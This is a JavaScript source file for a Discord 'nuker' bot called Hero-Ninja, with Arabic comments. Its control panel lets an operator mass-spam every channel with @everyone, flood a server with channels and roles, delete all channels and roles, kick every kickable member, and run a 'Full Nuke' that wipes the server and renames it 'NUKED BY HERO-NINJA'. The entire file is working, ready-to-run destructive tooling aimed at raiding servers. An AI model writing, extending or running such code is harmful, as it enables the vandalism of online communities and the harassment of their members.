const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ButtonBuilder, ButtonStyle } = require('discord.js');

let client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ] 
});

// متغيرات نحفظ فيها التوكن والايدي مؤقتاً
let botToken = process.env.BOT_TOKEN || '';
let guildId = '';

function setupClient() {
    client.on('ready', async () => {
        console.log(`[+] Logged in as ${client.user.tag}`);
    });

    // إرسال زر الإعدادات أول ما البوت يشتغل
    client.on('messageCreate', async (message) => {
        if (message.author.bot) return;
        
        // أمر إرسال زر الإعدادات
        if (message.content === '!setup') {
            const embed = new EmbedBuilder()
                .setTitle('Hero-Ninja Setup')
                .setDescription('Click the button below to configure your Bot Token and Server ID.')
                .setColor('Blue');

            const button = new ButtonBuilder()
                .setCustomId('setup_button')
                .setLabel('Configure Bot')
                .setStyle(ButtonStyle.Primary);

            const row = new ActionRowBuilder().addComponents(button);
            await message.channel.send({ embeds: [embed], components: [row] });
        }

        // أمر فتح القائمة (بعد الإعداد)
        if (message.content === '!menu' && guildId) {
            const embed = new EmbedBuilder()
                .setTitle('Hero-Ninja Control Panel')
                .setDescription('Select an option below:')
                .setColor('Red');

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('main_menu')
                .setPlaceholder('Select an action...')
                .addOptions(
                    new StringSelectMenuOptionBuilder().setLabel('Spam').setValue('spam').setDescription('Spam a specific channel'),
                    new StringSelectMenuOptionBuilder().setLabel('Spam All').setValue('spam_all').setDescription('Spam all channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Create Channels').setValue('create_channels').setDescription('Create text channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Create Roles').setValue('create_roles').setDescription('Create roles'),
                    new StringSelectMenuOptionBuilder().setLabel('Delete All Channels').setValue('delete_channels').setDescription('Delete all text channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Delete All Roles').setValue('delete_roles').setDescription('Delete all roles'),
                    new StringSelectMenuOptionBuilder().setLabel('Kick All').setValue('kick_all').setDescription('Kick all members'),
                    new StringSelectMenuOptionBuilder().setLabel('Full Nuke').setValue('full_nuke').setDescription('Destroy everything')
                );

            const row = new ActionRowBuilder().addComponents(selectMenu);
            await message.channel.send({ embeds: [embed], components: [row] });
        }
    });

    // التفاعل مع الأزرار والنوافذ
    client.on('interactionCreate', async (interaction) => {
        // إذا كبس على زر الإعدادات
        if (interaction.isButton() && interaction.customId === 'setup_button') {
            const modal = new ModalBuilder()
                .setCustomId('setup_modal')
                .setTitle('Bot Configuration');

            const tokenInput = new TextInputBuilder()
                .setCustomId('input_token')
                .setLabel('Bot Token')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Enter your bot token')
                .setRequired(true);

            const guildInput = new TextInputBuilder()
                .setCustomId('input_guild')
                .setLabel('Server ID')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Enter your server ID')
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput), new ActionRowBuilder().addComponents(guildInput));
            await interaction.showModal(modal);
            return;
        }

        // استقبال البيانات من نافذة الإعدادات
        if (interaction.isModalSubmit() && interaction.customId === 'setup_modal') {
            const newToken = interaction.fields.getTextInputValue('input_token');
            const newGuild = interaction.fields.getTextInputValue('input_guild');

            botToken = newToken;
            guildId = newGuild;

            await interaction.reply({ content: `[+] Settings saved!\nToken: ||${newToken.substring(0, 10)}...||\nServer ID: ${newGuild}`, ephemeral: true });

            // إعادة تشغيل البوت بالتوكن الجديد
            await client.destroy();
            client.login(botToken).catch(err => console.log('Login failed:', err));
            return;
        }

        // باقي التفاعلات (القائمة، النوافذ، إلخ)
        if (interaction.isStringSelectMenu() && interaction.customId === 'main_menu') {
            const choice = interaction.values[0];

            if (['delete_channels', 'delete_roles', 'kick_all', 'full_nuke'].includes(choice)) {
                await interaction.deferReply({ ephemeral: true });
                await executeAction(interaction, choice, null, null);
                return;
            }

            const modal = new ModalBuilder()
                .setCustomId(`modal_${choice}`)
                .setTitle('Enter Details');

            if (choice === 'spam' || choice === 'spam_all') {
                const amountInput = new TextInputBuilder()
                    .setCustomId('amount')
                    .setLabel('How many messages?')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('e.g., 5')
                    .setRequired(true);

                const textInput = new TextInputBuilder()
                    .setCustomId('text')
                    .setLabel('Message content')
                    .setStyle(TextInputStyle.Paragraph)
                    .setPlaceholder('@everyone NUKED BY HERO-NINJA')
                    .setRequired(false);

                modal.addComponents(new ActionRowBuilder().addComponents(amountInput), new ActionRowBuilder().addComponents(textInput));
            }
            
            else if (choice === 'create_channels' || choice === 'create_roles') {
                const amountInput = new TextInputBuilder()
                    .setCustomId('amount')
                    .setLabel('How many?')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('e.g., 10')
                    .setRequired(true);

                const nameInput = new TextInputBuilder()
                    .setCustomId('name')
                    .setLabel('What name?')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('e.g., hero')
                    .setRequired(false);

                modal.addComponents(new ActionRowBuilder().addComponents(amountInput), new ActionRowBuilder().addComponents(nameInput));
            }

            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit()) {
            const choice = interaction.customId.replace('modal_', '');
            const amount = interaction.fields.getTextInputValue('amount');
            let text = '';

            if (choice === 'spam' || choice === 'spam_all') {
                text = interaction.fields.getTextInputValue('text') || '@everyone NUKED BY HERO-NINJA';
            } else if (choice === 'create_channels' || choice === 'create_roles') {
                text = interaction.fields.getTextInputValue('name') || 'hero';
            }

            await interaction.deferReply({ ephemeral: true });
            await executeAction(interaction, choice, parseInt(amount) || 5, text);
        }
    });

    client.login(botToken).catch(err => console.log('Login failed. Waiting for setup.'));
}

async function executeAction(interaction, choice, amount, text) {
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return interaction.editReply({ content: "[-] Guild not found. Check GUILD_ID." });

    try {
        if (choice === 'spam') {
            for (let i = 0; i < amount; i++) {
                await interaction.channel.send(text).catch(() => {});
            }
            await interaction.editReply({ content: `Sent ${amount} messages.` });
        }
        else if (choice === 'spam_all') {
            for (const channel of guild.channels.cache.values()) {
                if (channel.isTextBased()) {
                    for (let i = 0; i < amount; i++) {
                        channel.send(text).catch(() => {});
                    }
                }
            }
            await interaction.editReply({ content: `Sent ${amount} messages in all channels.` });
        }
        else if (choice === 'create_channels') {
            for (let i = 1; i <= amount; i++) {
                await guild.channels.create({ name: `${text}-${i}` }).catch(() => {});
            }
            await interaction.editReply({ content: `Created ${amount} channels named "${text}".` });
        }
        else if (choice === 'create_roles') {
            for (let i = 1; i <= amount; i++) {
                await guild.roles.create({ name: `${text} ${i}` }).catch(() => {});
            }
            await interaction.editReply({ content: `Created ${amount} roles named "${text}".` });
        }
        else if (choice === 'delete_channels') {
            for (const channel of guild.channels.cache.values()) {
                await channel.delete().catch(() => {});
            }
        }
        else if (choice === 'delete_roles') {
            for (const role of guild.roles.cache.values()) {
                if (role.name !== '@everyone' && !role.managed) {
                    await role.delete().catch(() => {});
                }
            }
            await interaction.editReply({ content: 'Deleted all roles.' });
        }
        else if (choice === 'kick_all') {
            let count = 0;
            for (const member of guild.members.cache.values()) {
                if (member.kickable && member.id !== client.user.id) {
                    await member.kick('NUKED BY HERO-NINJA').catch(() => {});
                    count++;
                }
            }
            await interaction.editReply({ content: `Kicked ${count} members.` });
        }
        else if (choice === 'full_nuke') {
            for (const channel of guild.channels.cache.values()) {
                await channel.delete().catch(() => {});
            }
            for (const role of guild.roles.cache.values()) {
                if (role.name !== '@everyone' && !role.managed) {
                    await role.delete().catch(() => {});
                }
            }
            for (const member of guild.members.cache.values()) {
                if (member.kickable && member.id !== client.user.id) {
                    await member.kick('NUKED BY HERO-NINJA').catch(() => {});
                }
            }
            await guild.setName('NUKED BY HERO-NINJA').catch(() => {});
            for (let i = 1; i <= 20; i++) {
                await guild.channels.create({ name: `hero-is-here-${i}` }).catch(() => {});
            }
        }
    } catch (err) {
        await interaction.editReply({ content: `[-] Error: ${err.message}` }).catch(() => {});
    }
}

// تشغيل البوت
setupClient();
